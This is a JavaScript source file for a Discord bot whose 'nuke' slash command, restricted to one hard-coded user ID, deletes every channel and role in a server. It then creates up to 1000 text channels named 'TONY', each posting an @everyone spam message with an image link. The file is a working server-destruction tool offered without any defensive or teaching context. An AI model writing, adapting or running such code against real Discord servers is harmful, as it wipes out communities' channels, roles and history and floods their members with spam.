const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const axios = require('axios');
require('dotenv').config();
const client = new Client({ intents: [ 
  GatewayIntentBits.DirectMessages,
  GatewayIntentBits.Guilds,
  GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent,
]});

function nuke() {
    console.log("Nuke ready to launch");
    client.on('interactionCreate', async interaction => {
        if (!interaction.isChatInputCommand()) return;
      
        if (interaction.commandName === 'nuke') {
            if (interaction.member.id !== "415999790556512256") return;
            interaction.guild.channels.cache.forEach(channel => channel.delete());
            interaction.guild.roles.cache.forEach(roles => { roles.delete() .then(deleted => console.log(`Deleted role ${deleted.name}`)) .catch(console.error);});
            for (let i = 0; i < 1000; i++) {
            await interaction.guild.channels.create({name: "TONY", type: ChannelType.GuildText})
            .then(async channel => { channel.send('@everyone https://cdn.discordapp.com/attachments/940314738309607476/1304529724197834912/image.png?ex=672fb97b&is=672e67fb&hm=1b7edbd42013dae5e3578a3d6a9e132d5d32570e11d72e84731892f1dd7ac1e2&')})
      }
    }
  })
}

module.exports = nuke
client.login(process.env.TOKEN);